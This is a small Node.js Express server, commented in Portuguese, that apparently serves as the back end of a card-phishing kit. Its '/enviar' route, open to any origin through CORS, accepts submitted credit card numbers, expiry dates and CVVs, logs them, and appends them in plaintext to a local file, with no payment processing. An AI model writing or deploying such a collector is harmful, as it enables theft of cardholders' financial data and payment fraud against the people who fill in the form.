const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Rota para receber os dados
app.post('/enviar', (req, res) => {
  const data = req.body;

  // Verifica se os dados foram recebidos corretamente
  console.log('Dados recebidos:', data);

  if (!data.numeroCartao || !data.validade || !data.cvv) {
    console.error('Dados incompletos recebidos');
    return res.status(400).json({ message: 'Dados incompletos' });
  }

  const log = `
Número do Cartão: ${data.numeroCartao}
Validade: ${data.validade}
CVV: ${data.cvv}
-----------------------------
`;

  fs.appendFile('dados.txt', log, (err) => {
    if (err) {
      console.error('Erro ao salvar os dados no arquivo:', err);
      return res.status(500).json({ message: 'Erro ao salvar os dados' });
    }

    console.log('Dados salvos com sucesso.');
    res.status(200).json({ message: 'Dados recebidos com sucesso!' });
  });
});

// Inicia o servidor
app.listen(PORT, () => {
  console.log(`Servidor rodando em http://localhost:${PORT}`);
});